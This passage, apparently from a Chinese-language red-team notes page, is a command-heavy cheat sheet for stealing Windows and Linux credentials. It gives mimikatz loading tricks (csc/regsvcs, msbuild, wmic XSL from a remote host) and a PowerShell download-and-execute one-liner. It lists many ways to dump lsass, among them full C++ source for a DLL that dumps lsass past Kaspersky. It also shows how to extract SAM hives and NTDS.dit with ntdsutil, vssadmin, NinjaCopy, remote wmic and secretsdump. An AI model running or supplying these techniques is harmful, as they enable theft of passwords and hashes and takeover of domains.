'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n&gt;$Content = [System.Convert]::FromBase64String($key)\n&gt;Set-Content key.snk -Value $Content –Encoding Byte\nCmd执行\n&gt;C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs\n&gt;C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\regsvcs.exe katz.exe\n</code></pre>\n<h2 id=\"-458\"><a class=\"anchor\" href=\"#-458\">#</a> </h2>\n<h2 id=\"net-40-msbuild\"><a class=\"anchor\" href=\"#net-40-msbuild\">#</a> .net 4.0 Msbuild</h2>\n<pre><code>&gt;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild mimi.xml\n</code></pre>\n<h2 id=\"-459\"><a class=\"anchor\" href=\"#-459\">#</a> </h2>\n<h2 id=\"jscript\"><a class=\"anchor\" href=\"#jscript\">#</a> JScript</h2>\n<pre><code>&gt;wmic os get /format:&quot;mimikatz.xsl&quot;\n</code></pre>\n<p><img data-src=\"314.png\" alt=\"\" /></p>\n<pre><code>&gt;wmic os get /format:&quot;http://192.168.0.107/ps/mimi.xsl&quot;\n</code></pre>\n<h2 id=\"-460\"><a class=\"anchor\" href=\"#-460\">#</a> </h2>\n<h2 id=\"procdump64mimikatz\"><a class=\"anchor\" href=\"#procdump64mimikatz\">#</a> Procdump64+mimikatz</h2>\n<pre><code>&gt;procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp\n&gt;procdump.exe -accepteula -ma lsass.exe lsass.dmp\n&gt;mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit\n&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot;\n</code></pre>\n<h2 id=\"-461\"><a class=\"anchor\" href=\"#-461\">#</a> </h2>\n<h2 id=\"dumpert\"><a class=\"anchor\" href=\"#dumpert\">#</a> Dumpert</h2>\n<pre><code>https://github.com/outflanknl/Dumpert\n有三种，分别是dll，可执行文件和cs的Aggressor插件，这里测试下dll和exe\nDLL的执行方式是\nrundll32.exe C:\\Outflank-Dumpert.dll,Dump\n</code></pre>\n<p><img data-src=\"653.png\" alt=\"\" /></p>\n<pre><code>文件保存在c:\\windows\\temp\\dumpert.dmp\n用mimikatz\n&gt;sekurlsa::mimidump c:\\windows\\temp\\dumpert.dmp\n&gt;sekurlsa::logonpasswords\n</code></pre>\n<p><img data-src=\"654.png\" alt=\"\" /></p>\n<pre><code>可执行文件就直接执行就可以了\n</code></pre>\n<p><img data-src=\"655.png\" alt=\"\" /><br />\n<img data-src=\"656.png\" alt=\"\" /><br />\n<img data-src=\"657.png\" alt=\"\" /></p>\n<h2 id=\"-462\"><a class=\"anchor\" href=\"#-462\">#</a> </h2>\n<h2 id=\"cisco-jabber转储lsass\"><a class=\"anchor\" href=\"#cisco-jabber转储lsass\">#</a> Cisco Jabber 转储 lsass</h2>\n<pre><code>cd c:\\program files (x86)\\cisco systems\\cisco jabber\\x64\\\nprocessdump.exe (ps lsass).id c:\\temp\\lsass.dmp\n</code></pre>\n<h2 id=\"-463\"><a class=\"anchor\" href=\"#-463\">#</a> </h2>\n<h2 id=\"绕过卡巴斯基\"><a class=\"anchor\" href=\"#绕过卡巴斯基\">#</a> 绕过卡巴斯基</h2>\n<pre><code>https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e\n</code></pre>\n<p><img data-src=\"315.png\" alt=\"\" /></p>\n<pre><code>将三个文件下载到本地，使用visual studio进行编译，需要修改了几个地方。\n（1）添加如下代码\n#pragma comment(lib, &quot;Rpcrt4.lib&quot;) （引入Rpcrt4.lib库文件）\n（2）将.c文件后缀改成.cpp （使用了c++代码，需要更改后缀）\n（3) 编译时选择x64\n编译得到exe文件\nVisual studio创建c++空项目\n配置类型选dll\n字符集选Unicode，调试器选64位\nDll保存在C:\\\\windows\\\\temp\\\\1.bin\n</code></pre>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;cstdio></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;DbgHelp.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span>  </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;map></span>  </span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;TlHelp32.h></span> </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">,</span></span><span class=\"token string\">\"Dbghelp.lib\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">FindPID</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tPROCESSENTRY32 pe32<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tpe32<span class=\"token punctuation\">.</span>dwSize <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tHANDLE hProcessSnap <span class=\"token operator\">=</span> <span class=\"token function\">CreateToolhelp32Snapshot</span><span class=\"token punctuation\">(</span>TH32CS_SNAPPROCESS<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hProcessSnap <span class=\"token operator\">==</span> INVALID_HANDLE_VALUE<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"CreateToolhelp32Snapshot Error!\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tBOOL bResult <span class=\"token operator\">=</span> <span class=\"token function\">Process32First</span><span class=\"token punctuation\">(</span>hProcessSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>bResult<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">_wcsicmp</span><span class=\"token punctuation\">(</span>pe32<span class=\"token punctuation\">.</span>szExeFile<span class=\"token punctuation\">,</span> L<span class=\"token string\">\"lsass.exe\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> pe32<span class=\"token punctuation\">.</span>th32ProcessID<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\tbResult <span class=\"token operator\">=</span> <span class=\"token function\">Process32Next</span><span class=\"token punctuation\">(</span>hProcessSnap<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pe32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hProcessSnap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token function\">HRESULT</span><span class=\"token punctuation\">(</span>WINAPI<span class=\"token operator\">*</span> _MiniDumpW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tDWORD arg1<span class=\"token punctuation\">,</span> DWORD arg2<span class=\"token punctuation\">,</span> PWCHAR cmdline<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token function\">NTSTATUS</span><span class=\"token punctuation\">(</span>WINAPI<span class=\"token operator\">*</span> _RtlAdjustPrivilege<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tULONG Privilege<span class=\"token punctuation\">,</span> BOOL Enable<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tBOOL CurrentThread<span class=\"token punctuation\">,</span> PULONG Enabled<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tHRESULT             hr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t_MiniDumpW          MiniDumpW<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t_RtlAdjustPrivilege RtlAdjustPrivilege<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\tULONG               t<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tMiniDumpW <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>_MiniDumpW<span class=\"token punctuation\">)</span><span class=\"token function\">GetProcAddress</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t<span class=\"token function\">LoadLibrary</span><span class=\"token punctuation\">(</span>L<span class=\"token string\">\"comsvcs.dll\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"MiniDumpW\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tRtlAdjustPrivilege <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>_RtlAdjustPrivilege<span class=\"token punctuation\">)</span><span class=\"token function\">GetProcAddress</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t<span class=\"token function\">GetModuleHandle</span><span class=\"token punctuation\">(</span>L<span class=\"token string\">\"ntdll\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"RtlAdjustPrivilege\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>MiniDumpW <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token comment\">// try enable debug privilege</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t<span class=\"token function\">RtlAdjustPrivilege</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> TRUE<span class=\"token punctuation\">,</span> FALSE<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t<span class=\"token keyword\">wchar_t</span>  ws<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token function\">swprintf</span><span class=\"token punctuation\">(</span>ws<span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"%hd%hs\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">FindPID</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\" C:\\\\windows\\\\temp\\\\1.bin full\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token function\">MiniDumpW</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> ws<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>BOOL APIENTRY <span class=\"token function\">DllMain</span><span class=\"token punctuation\">(</span>HMODULE hModule<span class=\"token punctuation\">,</span> DWORD  ul_reason_for_call<span class=\"token punctuation\">,</span> LPVOID lpReserved<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>ul_reason_for_call<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token keyword\">case</span> DLL_PROCESS_ATTACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t<span class=\"token function\">dump</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t<span class=\"token keyword\">case</span> DLL_THREAD_ATTACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token keyword\">case</span> DLL_THREAD_DETACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token keyword\">case</span> DLL_PROCESS_DETACH<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>&gt;xxx.exe c:\\xx\\xx\\xx.dll使用绝对路径\n</code></pre>\n<h2 id=\"-464\"><a class=\"anchor\" href=\"#-464\">#</a> </h2>\n<h2 id=\"远程lsass进程转储-physmem2profit\"><a class=\"anchor\" href=\"#远程lsass进程转储-physmem2profit\">#</a> 远程 LSASS 进程转储 - Physmem2profit</h2>\n<pre><code>https://github.com/FSecureLABS/physmem2profit\nmimikatz被多数安全人员用来获取凭据，但现在的AV/EDR很轻易的识别并查杀，这里不在服务器端使用mimikatz，远程对lsass进程进行转储。\n服务器端直接使用visual studio构建\nphysmem2profit-public\\server\\\n</code></pre>\n<p><img data-src=\"691.png\" alt=\"\" /></p>\n<pre><code>客户端\n&gt;git clone --recurse-submodules https://github.com/FSecureLABS/physmem2profit.git\n客户端这里先安装\n&gt;bash physmem2profit/client/install.sh\n</code></pre>\n<p><img data-src=\"692.png\" alt=\"\" /></p>\n<pre><code>需要将此文件\nhttps://github.com/Velocidex/c-aff4/raw/master/tools/pmem/resources/winpmem/att_winpmem_64.sys\n传到目标服务器，我这里存放在c:\\windows\\temp\\中\n服务器端执行\n&gt;Physmem2profit.exe --ip 192.168.0.98 --port 8888 –verbose这里的IP是服务器端IP\n</code></pre>\n<p><img data-src=\"693.png\" alt=\"\" /></p>\n<pre><code>攻击端安装所需模块\n</code></pre>\n<p><img data-src=\"694.png\" alt=\"\" /></p>\n<pre><code>攻击端执行\n&gt;source physmem2profit/client/.env/bin/activate\n&gt;cd physmem2profit/client\n&gt;python3 physmem2profit --mode all --host 192.168.0.98 --port 8888 --drive winpmem --install 'c:\\windows\\temp\\att_winpmem_64.sys' --label test\n</code></pre>\n<p><img data-src=\"695.png\" alt=\"\" /></p>\n<pre><code>服务器端可以看到\n</code></pre>\n<p><img data-src=\"696.png\" alt=\"\" /></p>\n<pre><code>把生成的dmp文件转移到win系统上使用mimikatz即可获得hash，当然也可以在linux上使用pypykatz。\n</code></pre>\n<p><img data-src=\"697.png\" alt=\"\" /><br />\n<img data-src=\"698.png\" alt=\"\" /></p>\n<pre><code>再来一条转储lsass进程的命令\n要以system权限执行\n&gt;rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full\n</code></pre>\n<p><img data-src=\"699.png\" alt=\"\" /></p>\n<h2 id=\"-465\"><a class=\"anchor\" href=\"#-465\">#</a> </h2>\n<h2 id=\"sqldumpermimikatz\"><a class=\"anchor\" href=\"#sqldumpermimikatz\">#</a> SqlDumper+mimikatz</h2>\n<pre><code>位置C:\\Program Files\\Microsoft SQL Server\\number\\Shared\n&gt;tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号\n&gt;Sqldumper.exe ProcessID PID 0x01100  导出mdmp文件\n&gt;mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit\n</code></pre>\n<h2 id=\"-466\"><a class=\"anchor\" href=\"#-466\">#</a> </h2>\n<h2 id=\"mimipenguin\"><a class=\"anchor\" href=\"#mimipenguin\">#</a> Mimipenguin</h2>\n<pre><code>抓取linux下hash，root权限\nhttps://github.com/huntergregal/mimipenguin\n</code></pre>\n<h3 id=\"缓存hash提取\"><a class=\"anchor\" href=\"#缓存hash提取\">#</a> 缓存 hash 提取</h3>\n<h2 id=\"-467\"><a class=\"anchor\" href=\"#-467\">#</a> </h2>\n<h2 id=\"注册表\"><a class=\"anchor\" href=\"#注册表\">#</a> 注册表</h2>\n<pre><code>&gt;reg save hklm\\sam c:\\sam.hive &amp;reg save hklm\\system c:\\system.hive &amp;reg save hklm\\security c:\\security.hive\n&gt;mimikatz.exe &quot;lsadump::sam /system:sys.hive /sam:sam.hive&quot; exit\n</code></pre>\n<h2 id=\"-468\"><a class=\"anchor\" href=\"#-468\">#</a> </h2>\n<h2 id=\"ninjacopy\"><a class=\"anchor\" href=\"#ninjacopy\">#</a> Ninjacopy</h2>\n<pre><code>#http://192.168.0.101/powersploit/Exfiltration/Invoke-NinjaCopy.ps1\n&gt;powershell -exec bypass\n&gt;Import-Module .\\invoke-ninjacopy.ps1\n&gt;Invoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination .\\sam.hive\n&gt;Invoke-NinjaCopy –Path C:\\Windows\\System32\\config\\SYSTEM -LocalDestination .\\system.hive\n&gt;Invoke-NinjaCopy -Path &quot;c:\\windows\\ntds\\ntds.dit&quot; -LocalDestination &quot;C:\\Windows\\Temp\\1.dit&quot;\n&gt;Invoke-NinjaCopy -Path &quot;c:\\windows\\ntds\\ntds.dit&quot; -ComputerName &quot;dc.zone.com&quot; -LocalDestination &quot;C:\\Windows\\Temp\\1.dit&quot;\n</code></pre>\n<p><img data-src=\"316.png\" alt=\"\" /></p>\n<h2 id=\"-469\"><a class=\"anchor\" href=\"#-469\">#</a> </h2>\n<h2 id=\"quarks-pwdump\"><a class=\"anchor\" href=\"#quarks-pwdump\">#</a> Quarks-pwdump</h2>\n<pre><code>&gt;quarks-pwdump.exe –dump-hash-domain\n</code></pre>\n<h3 id=\"域hash提取\"><a class=\"anchor\" href=\"#域hash提取\">#</a> 域 hash 提取</h3>\n<h2 id=\"-470\"><a class=\"anchor\" href=\"#-470\">#</a> </h2>\n<h2 id=\"ntdsutil\"><a class=\"anchor\" href=\"#ntdsutil\">#</a> Ntdsutil</h2>\n<pre><code>&gt;ntdsutil\n&gt;snapshot\n&gt;activate instance ntds\n&gt;create\n&gt;mount &#123;guid&#125;\n&gt;copy 装载点\\windows\\NTDS\\ntds.dit d:\\ntds_save.dit\n&gt;unmount &#123;guid&#125;\n&gt;delete &#123;guid&#125;\n&gt;quit\n&amp;\n创建\n&gt; ntdsutil snapshot “activate instance ntds” create quit quit\n挂载\n&gt; ntdsutil snapshot “mount &#123;guid&#125;” quit quit\n复制\n&gt;copy c:\\$SNAP_XXX_VOLUMEC$\\windows\\NTDS\\ntds.dit d:\\ntds_save.dit\n卸载并删除\n&gt; ntdsutil snapshot “unmounts &#123;guid&#125;” “delete &#123;guid&#125;” quit quit\n删除后检测\n&gt; ntdsutil snapshot “List All” quit quit\n提取hash\n&gt; QuarksPwDump -dump-hash-domain -ntds-file d:\\ntds_save.dit\n</code></pre>\n<h2 id=\"-471\"><a class=\"anchor\" href=\"#-471\">#</a> </h2>\n<h2 id=\"vssadmin\"><a class=\"anchor\" href=\"#vssadmin\">#</a> Vssadmin</h2>\n<pre><code>创建C盘卷影拷贝\n&gt;vssadmin create shadow /for=c:\n复制ntds.dit\n&gt;copy &#123;Shadow Copy Volume Name&#125;\\windows\\NTDS\\ntds.dit c:\\ntds.dit\n删除拷贝\n&gt;vssadmin delete shadows /for=c: /quiet\n</code></pre>\n<h2 id=\"-472\"><a class=\"anchor\" href=\"#-472\">#</a> </h2>\n<h2 id=\"impacket\"><a class=\"anchor\" href=\"#impacket\">#</a> Impacket</h2>\n<pre><code>Impacket中的secretsdump.py\n#impacket-secretsdump –system SYSTEM –ntds.dit LOCAL\n或\n#impacket-secretsdump –hashs xxx:xxx –just-dc xxx.com/admin\\@192.168.1.1\n</code></pre>\n<h2 id=\"-473\"><a class=\"anchor\" href=\"#-473\">#</a> </h2>\n<h2 id=\"ntdsdumpex\"><a class=\"anchor\" href=\"#ntdsdumpex\">#</a> NTDSDumpex</h2>\n<pre><code>&gt;Invoke-NinjaCopy -Path &quot;c:\\windows\\ntds\\ntds.dit&quot; -LocalDestination &quot;C:\\Windows\\Temp\\1.dit&quot;\n&gt;reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM.hive\nhttps://github.com/zcgonvh/NTDSDumpEx\n&gt;NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive\n</code></pre>\n<h2 id=\"-474\"><a class=\"anchor\" href=\"#-474\">#</a> </h2>\n<h2 id=\"wmi调用vssadmin\"><a class=\"anchor\" href=\"#wmi调用vssadmin\">#</a> WMI 调用 Vssadmin</h2>\n<pre><code>&gt;wmic /node:dc /user:xxxx\\admin /password:passwd process call create &quot;cmd /c vssadmin create shadow /for=C: 2&gt;&amp;1&quot;\n&gt;wmic /node:dc /user:P xxxx\\admin /password: passwd process call create &quot;cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit 2&gt;&amp;1&quot;\n&gt;wmic /node:dc /user: xxxx\\admin /password: passwd process call create &quot;cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM\\ C:\\temp\\SYSTEM.hive 2&gt;&amp;1&quot;\n&gt;copy \\\\10.0.0.1\\c$\\temp\\ntds.dit C:\\temp\nPS C:\\Users\\test.PENTESTLAB&gt; copy \\\\10.0.0.1\\c$\\temp\\SYSTEM.hive C:\\temp\n</code></pre>\n<h2 id=\"-475\"><a class=\"anchor\" href=\"#-475\">#</a> </h2>\n<h2 id=\"powersploit\"><a class=\"anchor\" href=\"#powersploit\">#</a> PowerSploit</h2>\n<pre><code>PS &gt;Import-Module .\\VolumeShadowCopyTools.ps1\nPS &gt;New-VolumeShadowCopy -Volume C:\\\nPS &gt;Get-VolumeShadowCopy\n</code></pre>\n<h2 id=\"-476\"><a class=\"anchor\" href=\"#-476\">#</a> </h2>\n<h2 